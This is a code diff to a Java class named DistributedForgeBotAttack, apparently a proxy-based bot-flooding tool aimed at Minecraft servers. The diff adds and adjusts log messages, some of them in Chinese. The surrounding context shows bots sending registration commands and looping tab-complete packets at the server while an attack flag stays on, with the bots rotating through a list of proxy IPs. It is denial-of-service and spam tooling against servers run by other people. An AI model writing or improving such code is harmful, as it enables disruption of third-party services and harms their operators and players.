@@ -157,6 +157,7 @@ public class DistributedForgeBotAttack extends Util {
                     new Thread(() -> {
                         client.getSession().send(new ClientChatPacket("/register qwqovo8898 qwqovo8898"));
                         if (tab) {
+                            log("开始发送TAB包");
                             while (isAttack) {
                                 client.getSession().send(new ClientTabCompletePacket("/"));
                                 try {
@@ -194,7 +195,8 @@ public class DistributedForgeBotAttack extends Util {
             public void disconnected(DisconnectedEvent disconnectedEvent) {
                 String msg = disconnectedEvent.getReason();
                 if (msg.contains("refused") || msg.contains("here") || !isAttack) return;
-                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg);
+                Throwable t = disconnectedEvent.getCause();
+                log("用户 " + mc.getProfile().getName() + "断开连接： " + msg + (t==null?"":t.toString()));
             }
         });
         if (lele) new Thread(() -> getMotd(proxy)).start();
@@ -267,7 +269,6 @@ public class DistributedForgeBotAttack extends Util {
                         String po = ipsKey.get(index);
 
                         while (!po.contains(":")) {
-                            log(":");
                             index++;
                             if (index >= ipsKey.size() - 1) {
                                 index = 0;
